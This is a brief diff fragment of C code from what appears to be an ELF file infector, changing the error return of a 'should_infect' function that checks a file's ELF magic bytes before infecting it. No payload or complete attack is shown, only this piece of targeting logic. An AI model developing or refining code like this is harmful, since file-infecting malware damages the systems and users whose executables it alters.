@@ -275,7 +275,7 @@ static int should_infect(int fd) {
     char magic[EI_NIDENT];
     struct io_all_result result = pread_all(fd, magic, sizeof(magic), 0);
     if (result.remaining > 0) {
-        return result.err ? -result.err : 1;
+        return -result.err;
     }
 
     if (magic[EI_MAG0] != ELFMAG0
